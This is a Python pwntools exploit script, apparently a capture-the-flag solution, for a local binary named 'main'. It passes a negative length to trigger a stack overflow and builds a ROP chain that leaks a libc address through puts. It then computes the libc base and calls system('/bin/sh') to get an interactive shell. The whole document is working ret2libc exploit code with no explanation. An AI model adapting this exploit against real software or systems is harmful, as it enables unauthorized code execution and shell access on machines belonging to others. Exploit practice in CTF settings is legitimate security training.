from pwn import * 

pop_rdi = 0x0000000000400a93
libc_main = 0x0000000000600ff0
puts_plt = 0x400700
pop_rsi = 0x0000000000400a91
main = 0x4007b0
p = process("./main")
elf=ELF("main")
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=elf.libc
p.recvuntil("message length:")
p.sendline("-1")
p.recvuntil("your ID:")
#p.send("")
#p.send("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
#p.send("A"*300)
p.sendline("--22")
#p.sendline("1")
payload = ""
payload += "A"*120
payload += p64(pop_rdi)
payload += p64(libc_main)
payload += p64(puts_plt)
payload += p64(main)
payload += p64(0x00)
pause()
p.send(payload)
p.recvuntil("Goodbye!\n")
data = p.recvline().strip()
leak = u64(data.ljust(8,"\x00"))
#base = leak - 0x0000000000021ab0
base=leak-libc.symbols["__libc_start_main"]
system = base + libc.symbols["system"]
binsh = base + libc.search("/bin/sh\x00").next()
print "base: ",hex(base)
print "system: ",hex(system)
print "binsh: ",hex(binsh)
payload = ""
payload += "A"*120
payload += p64(pop_rsi)
payload += p64(0xdeadbeef)
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
#pause()
#pause()
p.sendline(payload)
p.sendline(payload)
p.interactive()
